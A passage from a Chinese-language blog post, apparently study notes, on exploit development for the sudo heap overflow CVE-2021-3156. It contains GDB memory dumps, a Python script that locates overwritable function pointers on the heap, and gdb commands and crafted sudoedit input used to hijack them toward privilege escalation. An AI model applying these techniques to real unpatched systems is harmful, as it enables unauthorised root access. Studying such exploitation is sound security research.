Heap | Ep. 10</p><p>Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11</p><p>Developing GDB Extension for Heap Exploitation | Ep. 12</p></blockquote><h1 id="编写exp思路"><a class="markdownIt-Anchor" href="#编写exp思路"></a> 编写exp思路</h1><p>对于CTF中常见的堆思路是通过堆分配算法，使用<code>free</code>、<code>malloc</code>进行exp的编写，所以一般会出现一些菜单让你使用这些功能。<strong>本质上是攻击堆分配算法</strong></p><p>但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的<code>free</code>、<code>malloc</code>，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。<strong>本质上是攻击堆上的数据</strong></p><h2 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> GDB调试</h2><p>不适用asan重新编译后，使用<strong>GEF</strong>分析crash时堆的分布</p><p><img src="https://img.joe1sn.top/uploads/big/532a062a01ed40da463ddb63ede2b010.png" alt="image-20220414081956697" /></p><p>一个很明显的堆溢出，再看看出发时的堆分布</p><p>断点</p><p><img src="https://img.joe1sn.top/uploads/big/977a9e1186a3d96c3b29ef7214e2f822.png" alt="image-20220414082506061" /></p><p>堆chunk</p><p><img src="https://img.joe1sn.top/uploads/big/929d8e8804974a002194405514a80b0c.png" alt="image-20220414082234355" /></p><p><img src="https://img.joe1sn.top/uploads/big/cf2f151144da211172788131fd8df6bb.png" alt="image-20220414082408083" /></p><p>再次到达断点，堆溢出</p><p><img src="https://img.joe1sn.top/uploads/big/7da088de496daf242ff6f08f51273c77.png" alt="image-20220414083507789" /></p><h2 id="困难与解决"><a class="markdownIt-Anchor" href="#困难与解决"></a> 困难与解决</h2><p>这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。</p><p>如何解决，有两个思路</p><ul><li><p>作者收到了<a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">原文报告</a>的启发，尝试编写小工具去“控制”堆</p><blockquote><p>To implement this initial technique, we wrote a rudimentary brute-forcer<br />that executes Sudo inside gdb, overflows the “user_args” buffer, and<br />randomly selects the following parameters:</p></blockquote></li><li><p>通过覆写其他堆中的函数指针来实现rce或者提权</p></li></ul><h1 id="函数指针工具编写"><a class="markdownIt-Anchor" href="#函数指针工具编写"></a> 函数指针工具编写</h1><h2 id="思路分析"><a class="markdownIt-Anchor" href="#思路分析"></a> 思路分析</h2><p>从gdb的<code>vmmap</code>指令我们知道程序有哪些代码段</p><p><img src="https://img.joe1sn.top/uploads/big/aafecabf6b9432e4732b8135953de8fe.png" alt="image-20220414084942194" /></p><p>如果在堆内存中带有<code>x</code>即可执行权限的话就可能存在能够被我们利用的函数指针</p><h2 id="工具编写"><a class="markdownIt-Anchor" href="#工具编写"></a> 工具编写</h2><ol><li><p>写入但是没有溢出的情况下，在漏洞函数断点，dump内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000</span><br></pre></td></tr></table></figure></li><li><p>复制<code>vmmap</code>结果，尝试分析出有可执行权限的内存地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]</span><br><span class="line">0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE</span><br><span class="line">0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure></li><li><p>编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">vmmap=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]</span></span><br><span class="line"><span class="string">0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span></span><br><span class="line"><span class="string">0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE</span></span><br><span class="line"><span class="string">0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]</span></span><br><span class="line"><span class="string">0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span></span><br><span class="line"><span class="string">0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">memmap = []</span><br><span class="line"><span class="keyword">for</span> mem <span class="keyword">in</span> vmmap.splitlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;r-x&#x27;</span> <span class="keyword">in</span> mem:</span><br><span class="line">        start, end, size, perm, f = mem.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        start = <span class="built_in">int</span>(start, <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(end, <span class="number">16</span>)</span><br><span class="line">        memmap.append((start, end))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/pwd/heap&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    heap = f.read()</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(heap), <span class="number">8</span>):</span><br><span class="line">    heap_addr = i+<span class="number">0x005555555f9000</span></span><br><span class="line">    b = heap[i:i+<span class="number">8</span>]</span><br><span class="line">    q = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, b)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mem <span class="keyword">in</span> memmap:</span><br><span class="line">        <span class="keyword">if</span> q&gt;=mem[<span class="number">0</span>] <span class="keyword">and</span> q&lt;=mem[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;set *0x<span class="subst">&#123;heap_addr:016x&#125;</span> = 0x&quot;</span>+(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]*<span class="number">5</span>))</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x000055555561b4d0</span> == heap_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;heap_addr:016x&#125;</span>: our [buffer]&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>得到结果</p><p><img src="https://img.joe1sn.top/uploads/big/449bbaa76e8ed77743a08a0c31acb492.png" alt="image-20220414092034283" /></p><p>能堆溢出的堆在最下面，不能覆写任何函数指针，艹</p></li><li><p>重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(heap), <span class="number">8</span>):</span><br><span class="line">    heap_addr = i+<span class="number">0x005555555f9000</span></span><br><span class="line">    b = heap[i:i+<span class="number">8</span>]</span><br><span class="line">    q = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, b)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mem <span class="keyword">in</span> memmap:</span><br><span class="line">        <span class="keyword">if</span> q&gt;=mem[<span class="number">0</span>] <span class="keyword">and</span> q&lt;=mem[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;set *0x<span class="subst">&#123;heap_addr:016x&#125;</span> = 0x&quot;</span>+(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]*<span class="number">5</span>))</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x000055555561b4d0</span> == heap_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;heap_addr:016x&#125;</span>: our [buffer]&quot;</span>)</span><br></pre></td></tr></table></figure><p>生成不会造成<code>crash</code>的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;0edit\x00-s\x000000000&quot; &gt; /tmp/normal</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f75b0c385d066b7147fb7d12818f4fbf.png" alt="image-20220414092905786" /></p><p>在gdb中设置这些值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">set *0x00005555556149a8 = 0x4141414141</span><br><span class="line">set *0x00005555556149b0 = 0x4242424242</span><br><span class="line">set *0x0000555555615260 = 0x4343434343</span><br><span class="line">set *0x0000555555615268 = 0x4444444444</span><br><span class="line">set *0x0000555555617e00 = 0x4545454545</span><br><span class="line">set *0x0000555555617eb0 = 0x4646464646</span><br><span class="line">set *0x0000555555618378 = 0x4747474747</span><br><span class="line">set *0x0000555555618398 = 0x4848484848</span><br><span class="line">set *0x00005555556183b8 = 0x4949494949</span><br><span class="line">set *0x00005555556183d8 = 0x4a4a4a4a4a</span><br><span class="line">set *0x00005555556184d8 = 0x4b4b4b4b4b</span><br><span class="line">set *0x0000555555619b40 = 0x4c4c4c4c4c</span><br><span class="line">set *0x000055555561a0b0 = 0x4d4d4d4d4d</span><br></pre></td></tr></table></figure><p>取消断点继续，应该就会出现一些报错了</p><p><img src="https://img.joe1sn.top/uploads/big/1f7019cfc44dd23bc8341b49638dfff1.png" alt="image-20220414103302900" /></p><p>&gt;&gt;问题</p><ul><li><p>没有出现报错，并且直接执行了</p><p>脚本的相关的地址写错了</p></li></ul><p>发现一个红黑树!</p><p><img src="https://img.joe1sn.top/uploads/big/d2970fcab1ca82e6035b8dc63f429930.png" alt="image-20220414103855166" /></p><p>结果看到<code>compar</code>变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖<code>compar</code>地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，<code>set *0x000055555561a0b0 = 0x4d4d4d4d4d</code>换掉，得到另一个crash</p><p><img src="https://img.joe1sn.top/uploads/big/8f92f140a02788a9be9ae451e5e482b2.png" alt="image-20220415105540238" /></p></li></ol><h1 id="强制堆分配"><a class="markdownIt-Anchor" href="#强制堆分配"></a> 强制堆分配</h1><p>在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。</p><p>核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk</p><h2 id="改写sudo源码"><a class="markdownIt-Anchor" href="#改写sudo源码"></a> 改写sudo源码</h2><p>真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo</p><ol><li><p>添加打印参数Chunk地址</p><p><img src="https://img.joe1sn.top/uploads/big/2cef5162ba6a14905755f21063a29737.png" alt="image-20220414120240051" /></p></li><li><p>已上一节的红黑树为例，打印<code>compar</code>的值</p><p><s>忘写分号了</s></p><p><img src="https://img.joe1sn.top/uploads/big/0277679ee8b79157542b7ca86679262e.png" alt="image-20220414122222094" /></p><p><img 